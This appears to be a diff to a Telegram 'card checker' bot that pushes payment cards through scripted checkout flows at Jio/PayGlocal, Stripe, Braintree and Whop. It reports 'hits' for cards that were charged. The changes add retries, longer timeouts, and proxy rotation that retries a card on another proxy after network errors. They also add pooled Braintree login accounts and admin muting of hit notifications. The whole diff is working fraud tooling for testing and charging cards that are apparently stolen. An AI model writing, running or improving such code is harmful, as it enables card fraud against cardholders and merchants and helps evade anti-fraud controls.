@@ -1457,6 +1457,60 @@ HIT_NOTIFICATION_GROUP_ID = -1003887571060
 HIT_NOTIFICATION_ENABLED = True
 HIT_NOTIFICATION_THRESHOLD = "CHARGED/ORDER_PLACED"
 
+# ============ HIT OPT-OUT (per-user) ============
+# Users in this list get NO hit notifications posted to the hit group.
+# Managed with /offhit <user_id> and /onhit <user_id>.
+HIT_OPTOUT_FILE = str(data_path("hit_optout.json"))
+HIT_OPTOUT_USERS = set()
+
+
+def _load_hit_optout():
+    """Load the hit opt-out list from disk."""
+    global HIT_OPTOUT_USERS
+    try:
+        if os.path.exists(HIT_OPTOUT_FILE):
+            with open(HIT_OPTOUT_FILE, "r") as f:
+                data = json.load(f)
+            HIT_OPTOUT_USERS = set(int(x) for x in (data or []))
+            print(f"🔕 [HIT OPTOUT] Loaded {len(HIT_OPTOUT_USERS)} muted user(s)")
+    except Exception as e:
+        print(f"⚠️ [HIT OPTOUT] Failed to load: {e}")
+        HIT_OPTOUT_USERS = set()
+
+
+def _save_hit_optout():
+    """Persist the hit opt-out list to disk."""
+    try:
+        with open(HIT_OPTOUT_FILE, "w") as f:
+            json.dump(sorted(HIT_OPTOUT_USERS), f, indent=2)
+    except Exception as e:
+        print(f"⚠️ [HIT OPTOUT] Failed to save: {e}")
+
+
+def hit_notifications_muted(user_id) -> bool:
+    """True if hit notifications are muted for this user id."""
+    try:
+        return int(user_id) in HIT_OPTOUT_USERS
+    except (TypeError, ValueError):
+        return False
+
+
+def set_hit_notifications_muted(user_id, muted: bool) -> bool:
+    """Mute/unmute hit notifications for a user id. Returns True on success."""
+    try:
+        uid = int(user_id)
+    except (TypeError, ValueError):
+        return False
+    if muted:
+        HIT_OPTOUT_USERS.add(uid)
+    else:
+        HIT_OPTOUT_USERS.discard(uid)
+    _save_hit_optout()
+    return True
+
+
+_load_hit_optout()
+
 # ============ FEEDBACK GROUP CONFIG ============
 FEEDBACK_GROUP_ID = -1003803399895  # New group ID for feedback messages
 
@@ -12465,6 +12519,7 @@ class GatewayManager:
             
             # ST1
             "st1": {"enabled": True, "name": "ST1 Auth", "emoji": "🔐"},
+            "st1_charge": {"enabled": True, "name": "ST1 $1 Charge (GiveWP)", "emoji": "💎"},
             
             "stripe_auth0": {"enabled": True, "name": "Stripe Auth 0$", "emoji": "🔓"},
             "chk0": {"enabled": True, "name": "Stripe Auth 0$", "emoji": "🔓"},
@@ -12473,6 +12528,17 @@ class GatewayManager:
             "stco": {"enabled": True, "name": "Stripe Checkout Hitter", "emoji": "💳", "tier": "ultimate"},
             "jhit": {"enabled": True, "name": "Jio Recharge Hitter", "emoji": "📱", "tier": "ultimate"},
             "whop": {"enabled": True, "name": "Whop Checkout Hitter", "emoji": "🛒", "tier": "ultimate"},
+
+            # Extra gateways (so /on & /off work for every gate)
+            "stripe_sk": {"enabled": True, "name": "Stripe SK Charge", "emoji": "💳"},
+            "stripe_chk": {"enabled": True, "name": "Stripe Check", "emoji": "💳"},
+            "stripe_1usd": {"enabled": True, "name": "Stripe 1 USD", "emoji": "💳"},
+            "paypal_key": {"enabled": True, "name": "PayPal Key", "emoji": "💸"},
+            "bt_kaffn8": {"enabled": True, "name": "Braintree Kaffn8", "emoji": "🔷"},
+            "ezycourse": {"enabled": True, "name": "EzyCourse", "emoji": "💳"},
+            "boutique": {"enabled": True, "name": "Boutique Stripe", "emoji": "💳"},
+            "payglocal": {"enabled": True, "name": "PayGlocal", "emoji": "💳"},
+            "dork": {"enabled": True, "name": "Dork", "emoji": "💳"},
         }
         self.load_status()
     
@@ -12485,6 +12551,13 @@ class GatewayManager:
                     for gateway, data in saved.items():
                         if gateway in self.gateways:
                             self.gateways[gateway]["enabled"] = data.get("enabled", True)
+                        else:
+                            # Restore auto-registered gateways so /on & /off persist
+                            self.gateways[gateway] = {
+                                "enabled": data.get("enabled", True),
+                                "name": data.get("name") or gateway.replace("_", " ").title(),
+                                "emoji": data.get("emoji", "💳"),
+                            }
                 print(f"✅ Loaded gateway status from {self.status_file}")
             except Exception as e:
                 print(f"⚠️ Error loading gateway status: {e}")
@@ -12494,7 +12567,11 @@ class GatewayManager:
         try:
             data = {}
             for gateway, info in self.gateways.items():
-                data[gateway] = {"enabled": info["enabled"]}
+                data[gateway] = {
+                    "enabled": info["enabled"],
+                    "name": info.get("name", gateway),
+                    "emoji": info.get("emoji", "💳"),
+                }
             with open(self.status_file, 'w') as f:
                 json.dump(data, f, indent=2)
             print(f"💾 Saved gateway status to {self.status_file}")
@@ -12537,7 +12614,13 @@ class GatewayManager:
             "nstripe": "new_stripe", "nstripem": "new_stripe",
             "stc1": "stc1", "mstc": "stc1",
             "sc1": "sc1", "msc1": "sc1",
-            "st1": "st1", "mst1": "st1",
+            "st1": "st1_charge", "mst1": "st1_charge", "st1c": "st1_charge",
+            "st1auth": "st1", "st1_gateway": "st1_gateway",
+            "sk": "stripe_sk", "msk": "stripe_sk",
+            "sq": "square_1usd", "msq": "square_1usd",
+            "bt": "bt_kaffn8", "mbt": "bt_kaffn8",
+            "stco": "stco",
+            "whop": "whop", "jhit": "jhit",
             "ct": "stripe_pl", "mct": "stripe_pl",
             "pa": "paypal_donation", "mpa": "paypal_donation",
             "p": "paypal_donation_50", "mp": "paypal_donation_50",
@@ -12562,13 +12645,22 @@ class GatewayManager:
             bool: True if successful
         """
         gateway_key = self._map_gateway(gateway)
-        
-        if gateway_key in self.gateways:
+        if not gateway_key:
+            return False
+
+        # Auto-register any gateway so /on and /off work for EVERY gate,
+        # even ones not present in the default list.
+        if gateway_key not in self.gateways:
+            self.gateways[gateway_key] = {
+                "enabled": enabled,
+                "name": gateway_key.replace("_", " ").title(),
+                "emoji": "💳",
+            }
+        else:
             self.gateways[gateway_key]["enabled"] = enabled
-            self.save_status()
-            return True
-        
-        return False
+
+        self.save_status()
+        return True
     
     def get_status(self, gateway: str) -> tuple:
         """Get gateway status and info"""
@@ -12595,6 +12687,7 @@ class GatewayManager:
             "🔷 Other": ["braintree", "b3charged", "payflow", "adyen", "adyen_direct", "st1"]
         }
         
+        shown = set()
         for category, gateways in categories.items():
             result += f"<b>{category}</b>\n"
             for gw in gateways:
@@ -12602,6 +12695,17 @@ class GatewayManager:
                     info = self.gateways[gw]
                     status = "✅ ON" if info["enabled"] else "❌ OFF"
                     result += f"   {info['emoji']} <code>{gw}</code> ➛ {status}\n"
+                    shown.add(gw)
+            result += "\n"
+
+        # Any gateway not covered above (incl. auto-registered ones)
+        extras = [g for g in self.gateways if g not in shown]
+        if extras:
+            result += "<b>🔧 Other / Extra</b>\n"
+            for gw in sorted(extras):
+                info = self.gateways[gw]
+                status = "✅ ON" if info["enabled"] else "❌ OFF"
+                result += f"   {info['emoji']} <code>{gw}</code> ➛ {status}\n"
             result += "\n"
         
         result += "━━━━━━━━━━━━━━━━━━━\n"
@@ -17948,7 +18052,7 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await progress_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
     
     # ============ SEND HIT NOTIFICATION IF CHARGED ============
-    if charged_card_data:
+    if charged_card_data and not hit_notifications_muted(user_id):
         try:
             # Get user data
             user_data = user_manager.get_user(user_id)
@@ -18330,6 +18434,11 @@ def mask_proxy(proxy: str) -> str:
 
 # ============ JIO MAIN FUNCTION ============
 
+# Per-request timeout (seconds) for the Jio/PayGlocal flow. 15s was too
+# short for the slow 'buy'/'pay' endpoints on proxied connections.
+JIO_TIMEOUT = 45
+
+
 def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
             proxy: str | None = None) -> dict:
     """Full Jio → EaseBuzz → PayGlocal checkout with proper status detection."""
@@ -18380,7 +18489,7 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
         r = jio_sess.get(
             f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{phone}",
             headers={**bh, "Referer": "https://www.jio.com/"},
-            timeout=20,
+            timeout=JIO_TIMEOUT,
         )
         if r.status_code not in (200, 201):
             result["error"] = f"Step 1 HTTP {r.status_code}: {r.text[:200]}"
@@ -18400,7 +18509,7 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
         r = jio_sess.get(
             f"https://www.jio.com/api/jio-recharge-service/recharge/plans/serviceId/{phone}",
             headers={**bh, "Referer": recharge_ref},
-            timeout=20,
+            timeout=JIO_TIMEOUT,
         )
         plan_key = _find_plan_key(r.json() if r.text.strip().startswith("{") else {}, amount)
         print(f"✅ Step 2: Plan key found: {plan_key}")
@@ -18417,19 +18526,28 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
 
     # ── Step 3: Buy ──────────────────────────────────────────────────────────
     print("📡 Step 3: Placing order...")
-    try:
-        jio_sess.post(
-            "https://www.jio.com/api/jio-recharge-service/recharge/buy",
-            headers={**bh, "Content-Type": "application/json",
-                     "Origin": "https://www.jio.com", "Referer": recharge_ref},
-            json={"planKey": plan_key, "selectedService": phone},
-            timeout=15,
-        )
-        print("✅ Step 3: Order placed")
-    except Exception as e:
-        result["error"] = f"Step 3: {e}"
+    last_err = None
+    for _attempt in range(1, 4):  # up to 3 attempts (endpoint is often slow)
+        try:
+            jio_sess.post(
+                "https://www.jio.com/api/jio-recharge-service/recharge/buy",
+                headers={**bh, "Content-Type": "application/json",
+                         "Origin": "https://www.jio.com", "Referer": recharge_ref},
+                json={"planKey": plan_key, "selectedService": phone},
+                timeout=JIO_TIMEOUT,
+            )
+            last_err = None
+            print("✅ Step 3: Order placed")
+            break
+        except Exception as e:
+            last_err = e
+            print(f"⚠️ Step 3 attempt {_attempt}/3 failed: {e}")
+            if _attempt < 3:
+                time.sleep(1.5)
+    if last_err is not None:
+        result["error"] = f"Step 3: {last_err}"
         result["status"] = "ERROR"
-        print(f"❌ Step 3 error: {e}")
+        print(f"❌ Step 3 error: {last_err}")
         return result
 
     # ── Step 4: Pay → paymentURL ──────────────────────────────────────────────
@@ -18444,7 +18562,7 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
                 "flexiTopupFlow": False,
                 "servicePlanList": [{"planKey": plan_key, "quantity": 1, "serviceId": phone}],
             },
-            timeout=15,
+            timeout=JIO_TIMEOUT,
         )
         payment_url = (r.json().get("paymentURL", "")
                        if r.text.strip().startswith("{") else "")
@@ -18472,7 +18590,7 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
                      "Sec-Fetch-Mode": "navigate",
                      "Sec-Fetch-Site": "same-site",
                      "Upgrade-Insecure-Requests": "1"},
-            timeout=15,
+            timeout=JIO_TIMEOUT,
             allow_redirects=True,
         )
         print(f"✅ Step 5: Redirect followed")
@@ -18511,7 +18629,7 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
                 "Upgrade-Insecure-Requests": "1",
             },
             data=form_fields,
-            timeout=20,
+            timeout=JIO_TIMEOUT,
             allow_redirects=True,
         )
         print(f"✅ Step 6: Form submitted")
@@ -18555,7 +18673,7 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
                 "copco": None,
                 "isStoreCreditSelected": None,
             },
-            timeout=15,
+            timeout=JIO_TIMEOUT,
         )
         bin_data = r.json() if r.text.strip().startswith("{") else {}
         print(f"✅ Step 7: BIN authorized")
@@ -18613,7 +18731,7 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
                     "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                 },
             },
-            timeout=30,
+            timeout=JIO_TIMEOUT,
         )
         ccdc_json = r.json() if r.text.strip().startswith("{") else {}
         print(f"✅ Step 8: Card submitted")
@@ -18657,7 +18775,7 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
         headers={"Content-Type": "application/x-www-form-urlencoded",
                  "Origin": "https://pay.jio.com", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
         data={"encdata": encdata_m.group(1)},
-        timeout=20,
+        timeout=JIO_TIMEOUT,
         allow_redirects=True,
     )
     m_gl = re.search(
@@ -18684,7 +18802,7 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
         params={"x-gl-token": gl_token},
         headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "text/html,*/*",
                  "Referer": "https://pay.easebuzz.in/"},
-        timeout=15,
+        timeout=JIO_TIMEOUT,
         allow_redirects=True,
     )
 
@@ -18717,7 +18835,7 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
                  "x-gl-gid": gid,
                  "x-gl-trusted-referrer": "",
                  "x-gl-referrer-mismatch": "false"},
-        timeout=15,
+        timeout=JIO_TIMEOUT,
     )
     
     # ============ SAFELY PARSE DC JSON ============
@@ -18743,7 +18861,7 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
         params={"x-gl-token": gl_token},
         headers=pg_api_h,
         json={"agentData": None, "visitorId": visitor_id},
-        timeout=15,
+        timeout=JIO_TIMEOUT,
     )
     
     # ============ SAFELY PARSE FP JSON ============
@@ -18806,7 +18924,7 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
         params={"x-gl-token": gl_token},
         headers=pg_api_h,
         json={"isEnc": "true", "kid": kid, "payload": jwe_token},
-        timeout=30,
+        timeout=JIO_TIMEOUT,
     )
     
     # ============ SAFELY PARSE PAYNOW JSON ============
@@ -18904,7 +19022,7 @@ def jio_hit(phone: str, amount: str, cc: str, mm: str, yy: str, cvv: str,
                 "reachData": {"fingerprintId": None},
                 "fallbackToInrCurrency": True,
             },
-            timeout=30,
+            timeout=JIO_TIMEOUT,
         )
     except Exception as e:
         print(f"⚠️ iPay request error: {e}")
@@ -19138,6 +19256,48 @@ def format_jio_response(result: Dict, card: str, compact: bool = False) -> Tuple
 
     return ui, status_category
 
+def _jhit_normalize_proxy(raw):
+    """Normalise a stored proxy string to user:pass@host:port (or return as-is)."""
+    if not raw:
+        return None
+    proxy = str(raw).strip()
+    if not proxy:
+        return None
+    if proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
+        return proxy
+    if "@" in proxy:
+        return proxy  # already user:pass@host:port
+    parts = proxy.split(":")
+    if len(parts) == 4:
+        # host:port:user:pass
+        if "." in parts[0] and parts[1].isdigit():
+            host, port, user, password = parts
+            return f"{user}:{password}@{host}:{port}"
+        # user:pass:host:port
+        user, password, host, port = parts
+        if "." in host and port.isdigit():
+            return f"{user}:{password}@{host}:{port}"
+    return proxy
+
+
+def _jhit_is_retryable_error(result: dict) -> bool:
+    """True if a failed Jio attempt is a network/timeout/proxy error (worth
+    retrying on another proxy) rather than a real card decline."""
+    if not result:
+        return False
+    if (result.get("status") or "").upper() != "ERROR":
+        return False
+    err = str(result.get("error") or result.get("message") or "").lower()
+    needles = (
+        "timed out", "timeout", "curl: (28)", "curl: (7)", "curl: (35)",
+        "curl: (56)", "curl: (52)", "connection", "connect", "proxy",
+        "recv failure", "couldn't connect", "could not connect",
+        "temporary failure", "reset by peer", "empty reply",
+        "operation was aborted", "ssl", "failed to perform",
+    )
+    return any(n in err for n in needles)
+
+
 # ============ JIO COMMAND HANDLER ============
 @check_gateway("jhit")
 @check_free_hit_limit("jhit")
@@ -19239,41 +19399,28 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         deduct_user_credits(user_id, len(cards))
         print(f"💎 User {user_id} used {len(cards)} credits for Jio multi-check. Remaining: {get_user_credits(user_id)}")
 
-    # ============ GET PROXY ============
-    # Only ever use the caller's OWN proxies. The old code fell back to
-    # load_stripe_proxies() and random.choice() over EVERY user's proxies,
-    # which is why /proxy said "no proxies" and /removeproxy said
-    # "not found" while /jhit was still routing through someone else's
-    # proxy. If the caller has no proxy, connect directly (proxy = None).
-    proxy = None
+    # ============ GET PROXIES (for automatic rotation) ============
+    # Only ever use the caller's OWN proxies. If the caller has none,
+    # connect directly (proxy = None). All of the caller's proxies are
+    # collected so a timed-out card can be retried on a different one.
+    user_proxies = []
     try:
-        proxy = get_stripe_user_proxy(user_id)
+        _all_proxies = load_stripe_proxies()
+        _raw = _all_proxies.get(str(user_id), []) if isinstance(_all_proxies, dict) else []
+        if isinstance(_raw, str):
+            _raw = [_raw]
+        for _p in (_raw or []):
+            _norm = _jhit_normalize_proxy(_p)
+            if _norm and _norm not in user_proxies:
+                user_proxies.append(_norm)
     except Exception as e:
-        print(f"⚠️ [jhit] proxy lookup failed: {e}")
-        proxy = None
+        print(f"\u26a0\ufe0f [jhit] proxy lookup failed: {e}")
 
-    # ============ FIX: Format proxy correctly ============
-    if proxy:
-        # Check if it's already in user:pass@host:port format
-        if '@' in proxy and ':' in proxy.split('@')[0]:
-            # Already correct format
-            pass
-        else:
-            parts = proxy.split(':')
-            if len(parts) == 4:
-                # host:port:user:pass
-                host, port, user, password = parts
-                if '.' in host and port.isdigit():
-                    proxy = f"{user}:{password}@{host}:{port}"
-                else:
-                    # Try user:pass:host:port
-                    user, password, host, port = parts
-                    if '.' in host and port.isdigit():
-                        proxy = f"{user}:{password}@{host}:{port}"
-        
-        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
-
-    proxy_str = proxy if proxy else None
+    if user_proxies:
+        print(f"\U0001f50c {len(user_proxies)} proxy(ies) for rotation: "
+              + ", ".join(mask_proxy(_p) for _p in user_proxies))
+    else:
+        print("\U0001f50c No proxies - direct connection")
 
     # ============ START PROCESSING CARDS ============
     total_cards = len(cards)
@@ -19327,9 +19474,42 @@ async def jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             pass
 
         try:
-            # Process the card
-            result = jio_hit(phone, amount, cc, mm, yy, cvv, proxy_str)
-            
+            # Process the card (run in the thread pool so the blocking
+            # network flow doesn't freeze the event loop / scheduler).
+            #
+            # AUTOMATIC PROXY ROTATION: if an attempt fails with a
+            # network/timeout error, retry the SAME card on the next
+            # proxy. When every proxy has been tried, the final attempt
+            # uses a direct connection (no proxy).
+            loop = asyncio.get_event_loop()
+            if user_proxies:
+                _off = (idx - 1) % len(user_proxies)
+                attempt_order = user_proxies[_off:] + user_proxies[:_off] + [None]
+            else:
+                attempt_order = [None]
+
+            result = None
+            for _ai, _attempt_proxy in enumerate(attempt_order):
+                result = await loop.run_in_executor(
+                    thread_pool, jio_hit,
+                    phone, amount, cc, mm, yy, cvv, _attempt_proxy
+                )
+                _st = (result.get("status") or "UNKNOWN").upper()
+                # Only network errors rotate - real declines stop here.
+                if _st != "ERROR" or not _jhit_is_retryable_error(result):
+                    break
+                if _ai < len(attempt_order) - 1:
+                    _next = attempt_order[_ai + 1]
+                    _label = "direct (no proxy)" if _next is None else mask_proxy(_next)
+                    print(f"\U0001f501 Card {idx} network error \u2192 retry on {_label}")
+                    try:
+                        await progress_msg.edit_text(
+                            build_progress_text(idx) + f"\n\n\U0001f501 Retry {_ai + 2}: {_label}",
+                            parse_mode=ParseMode.HTML)
+                    except Exception:
+                        pass
+                    await asyncio.sleep(1)
+
             status = result.get("status") or "UNKNOWN"
             # `message` is initialised to "" and is never populated on error
             # paths, so fall back to the actual error (e.g. proxy timeout)
@@ -23635,7 +23815,7 @@ async def send_hit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
         
         # Send notification
-        if HIT_NOTIFICATION_ENABLED:
+        if HIT_NOTIFICATION_ENABLED and not hit_notifications_muted(user_id):
             await context.bot.send_message(
                 chat_id=HIT_NOTIFICATION_GROUP_ID,
                 text=notification,
@@ -23738,6 +23918,74 @@ async def chk_card_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ============ UPDATED HIT NOTIFICATION WITH BLADESARKS BUTTON ============
 
+async def offhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mute a user's hit notifications — /offhit <user_id>"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+
+    if not context.args:
+        muted = ", ".join(f"<code>{u}</code>" for u in sorted(HIT_OPTOUT_USERS)) or "None"
+        await update.message.reply_text(
+            "🔕 <b>Mute Hit Notifications</b>\n\n"
+            "Usage: <code>/offhit &lt;user_id&gt;</code>\n"
+            "Example: <code>/offhit 6299808404</code>\n\n"
+            "This user's hits will no longer be sent to the hit group.\n"
+            "Use <code>/onhit &lt;user_id&gt;</code> to re-enable.\n\n"
+            f"📋 <b>Currently muted:</b> {muted}",
+            parse_mode=ParseMode.HTML)
+        return
+
+    try:
+        target = int(context.args[0])
+    except (TypeError, ValueError):
+        await update.message.reply_text(
+            "❌ Invalid user id. Example: <code>/offhit 6299808404</code>",
+            parse_mode=ParseMode.HTML)
+        return
+
+    set_hit_notifications_muted(target, True)
+    await update.message.reply_text(
+        f"🔕 <b>Hit notifications muted</b>\n\n"
+        f"👤 User: <code>{target}</code>\n"
+        f"✅ This user's hits will no longer be posted to the hit group.",
+        parse_mode=ParseMode.HTML)
+    print(f"🔕 [HIT OPTOUT] User {target} muted by admin")
+
+
+async def onhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Unmute a user's hit notifications — /onhit <user_id>"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+
+    if not context.args:
+        muted = ", ".join(f"<code>{u}</code>" for u in sorted(HIT_OPTOUT_USERS)) or "None"
+        await update.message.reply_text(
+            "🔔 <b>Unmute Hit Notifications</b>\n\n"
+            "Usage: <code>/onhit &lt;user_id&gt;</code>\n"
+            "Example: <code>/onhit 6299808404</code>\n\n"
+            f"📋 <b>Currently muted:</b> {muted}",
+            parse_mode=ParseMode.HTML)
+        return
+
+    try:
+        target = int(context.args[0])
+    except (TypeError, ValueError):
+        await update.message.reply_text(
+            "❌ Invalid user id. Example: <code>/onhit 6299808404</code>",
+            parse_mode=ParseMode.HTML)
+        return
+
+    set_hit_notifications_muted(target, False)
+    await update.message.reply_text(
+        f"🔔 <b>Hit notifications enabled</b>\n\n"
+        f"👤 User: <code>{target}</code>\n"
+        f"✅ This user's hits will be posted to the hit group again.",
+        parse_mode=ParseMode.HTML)
+    print(f"🔔 [HIT OPTOUT] User {target} unmuted by admin")
+
+
 async def send_hit_notification(context: ContextTypes.DEFAULT_TYPE, 
                                 gateway: str,
                                 card: str,   
@@ -23749,6 +23997,11 @@ async def send_hit_notification(context: ContextTypes.DEFAULT_TYPE,
     """Send hit notification with BLADESARKS button to the configured group"""
     
     if not HIT_NOTIFICATION_ENABLED:
+        return
+
+    # Respect per-user hit opt-out (/offhit)
+    if hit_notifications_muted((user or {}).get("id")):
+        print(f"🔕 [HIT NOTIFICATION] Muted for user {(user or {}).get('id')} - skipping")
         return
     
     print(f"🔔 [HIT NOTIFICATION] Gateway: {gateway}, Response: {response[:100]}")
@@ -24359,6 +24612,7 @@ class UserManager:
         "braintree",       # /bt command checks this key
         "stripe_charge",    # /st  (Strip £5)   — free users: 1 credit per check
         "stco",             # /stco (Stripe Checkout) — free users: 1 credit per check
+        "st1_charge",        # /st1 (ST1 $1 Charge) — free users: 1 credit per check
     ]
 
     # ─────────────────────────────────────────────────────────────
@@ -24390,6 +24644,7 @@ class UserManager:
                 "auto_stripe",
                 "paypal",
                 "stripe_charge",
+                "st1_charge",
                 "stripe_charge_v2",
                 "stripe_auth",
                 "stripe_auth0",
@@ -24454,6 +24709,7 @@ class UserManager:
                 "b3charged",
                 "razorpay",
                 "stripe_charge",
+                "st1_charge",
                 "stripe_auth",
                 "paypal_donation",
                 "stripe_chk",
@@ -24510,6 +24766,7 @@ class UserManager:
                 "b3charged",
                 "razorpay",
                 "stripe_charge",
+                "st1_charge",
                 "stripe_auth",
                 "paypal_donation",
                 "paypal_key", 
@@ -49394,6 +49651,104 @@ BT_K8_ACCOUNTS = [
     # ...add more
 ]
 
+# ─── Account management (persistent, managed via /addbt & /rbt) ──────
+BT_K8_ACCOUNTS_FILE = str(data_path("bt_k8_accounts.json"))
+
+
+def _bt_k8_load_accounts():
+    """Load BT_K8 accounts persisted by /addbt at startup."""
+    try:
+        if os.path.exists(BT_K8_ACCOUNTS_FILE):
+            with open(BT_K8_ACCOUNTS_FILE, "r") as f:
+                saved = json.load(f)
+            for entry in saved or []:
+                u = (entry or {}).get("user")
+                pw = (entry or {}).get("pass")
+                if u and pw and not any(a.get("user") == u for a in BT_K8_ACCOUNTS):
+                    BT_K8_ACCOUNTS.append({"user": u, "pass": pw})
+            print(f"\u2705 [BT_K8] Loaded {len(BT_K8_ACCOUNTS)} account(s)")
+    except Exception as e:
+        print(f"\u26a0\ufe0f [BT_K8] Failed to load accounts: {e}")
+
+
+def _bt_k8_save_accounts():
+    """Persist the current BT_K8 account pool to disk."""
+    try:
+        with open(BT_K8_ACCOUNTS_FILE, "w") as f:
+            json.dump(BT_K8_ACCOUNTS, f, indent=2)
+    except Exception as e:
+        print(f"\u26a0\ufe0f [BT_K8] Failed to save accounts: {e}")
+
+
+async def addbt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Add one or more Braintree (Kaffn8) accounts — /addbt user:pass [user:pass ...]"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("\u274c Admin only command.")
+        return
+
+    if not context.args:
+        await update.message.reply_text(
+            "\u2795 <b>Add Braintree Account</b>\n\n"
+            "Usage: <code>/addbt user:pass</code>\n"
+            "Multiple: <code>/addbt user1:pass1 user2:pass2</code>\n\n"
+            "Example: <code>/addbt test67:test1234</code>",
+            parse_mode=ParseMode.HTML)
+        return
+
+    added, updated, invalid = [], [], []
+    for token in " ".join(context.args).split():
+        if ":" in token:
+            user, _, pw = token.partition(":")
+        elif "|" in token:
+            user, _, pw = token.partition("|")
+        else:
+            invalid.append(token)
+            continue
+        user, pw = user.strip(), pw.strip()
+        if not user or not pw:
+            invalid.append(token)
+            continue
+        existing = next((a for a in BT_K8_ACCOUNTS if a.get("user") == user), None)
+        if existing:
+            existing["pass"] = pw
+            updated.append(user)
+        else:
+            BT_K8_ACCOUNTS.append({"user": user, "pass": pw})
+            added.append(user)
+
+    if added or updated:
+        _bt_k8_save_accounts()
+
+    lines = [
+        "\u2705 <b>Braintree Account(s) Saved</b>\n",
+        f"\U0001f4e6 <b>Total accounts</b> \u279b <b>{len(BT_K8_ACCOUNTS)}</b>",
+    ]
+    if added:
+        lines.append("\u2795 <b>Added</b> \u279b " + ", ".join(f"<code>{u}</code>" for u in added))
+    if updated:
+        lines.append("\u267b\ufe0f <b>Updated</b> \u279b " + ", ".join(f"<code>{u}</code>" for u in updated))
+    if invalid:
+        lines.append("\u26a0\ufe0f <b>Invalid</b> \u279b " + ", ".join(f"<code>{t}</code>" for t in invalid))
+    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)
+
+
+async def rbt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Remove ALL Braintree (Kaffn8) accounts — /rbt"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("\u274c Admin only command.")
+        return
+
+    count = len(BT_K8_ACCOUNTS)
+    BT_K8_ACCOUNTS.clear()
+    _bt_k8_save_accounts()
+    await update.message.reply_text(
+        f"\U0001f5d1 <b>All Braintree accounts removed</b>\n\n"
+        f"\u274c Cleared <b>{count}</b> account(s) from <code>BT_K8_ACCOUNTS</code>.",
+        parse_mode=ParseMode.HTML)
+
+
+_bt_k8_load_accounts()
+
 
 # Rotation state
 _bt_k8_account_index = 0
@@ -68921,6 +69276,7 @@ async def stopchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "B3Charged": b3charged_active_tasks,
         "Adyen Direct": adyen_direct_active_tasks,
         "Auto Stripe": auto_stripe_active_tasks,
+        "ST1 $1 Charge": st1_charge_active_tasks,
         "MSH Shopify": msh_active_tasks if 'msh_active_tasks' in globals() else {},
         "ST1": st1_active_tasks if 'st1_active_tasks' in globals() else {},
         "PayPal Donation": paypal_donation_active_tasks if 'paypal_donation_active_tasks' in globals() else {},
@@ -74162,6 +74518,10 @@ async def send_whop_hit_notification(
 ):
     if not HIT_NOTIFICATION_ENABLED:
         return
+    # Respect per-user hit opt-out (/offhit)
+    if hit_notifications_muted((user_data or {}).get("id")):
+        print(f"🔕 [WHOP HIT] Muted for user {(user_data or {}).get('id')} - skipping")
+        return
     if status not in ("CHARGED", "INSUFFICIENT_FUNDS"):
         return
 
@@ -74297,6 +74657,47 @@ def _whop_status_label(status: str, message: str) -> str:
 # ═══════════════════════════════════════════════════════════════════════════
 
 @check_gateway("whop")
+def _whop_extract_url_from_message(msg) -> Optional[str]:
+    """Pull a Whop checkout URL out of a Telegram message.
+
+    Checks the raw text/caption first, then falls back to message entities so
+    inline / tappable links are handled too. Used by /whop when the user
+    replies to a message that contains a Whop URL.
+    """
+    if msg is None:
+        return None
+
+    def _find(text):
+        if not text:
+            return None
+        for m in re.finditer(r"https?://[^\s<>\"']+", text):
+            u = m.group(0).rstrip(".,);]")
+            low = u.lower()
+            if "whop.com" in low or "whop.site" in low:
+                return u
+        return None
+
+    for attr in ("text", "caption"):
+        u = _find(getattr(msg, attr, None))
+        if u:
+            return u
+
+    for attr in ("entities", "caption_entities"):
+        entities = getattr(msg, attr, None) or []
+        base = getattr(msg, "text", None) or getattr(msg, "caption", None) or ""
+        for ent in entities:
+            ent_type = getattr(ent, "type", "")
+            candidate = None
+            if ent_type == "text_link":
+                candidate = getattr(ent, "url", None)
+            elif ent_type == "url":
+                candidate = base[ent.offset: ent.offset + ent.length]
+            u = _find(candidate)
+            if u:
+                return u
+    return None
+
+
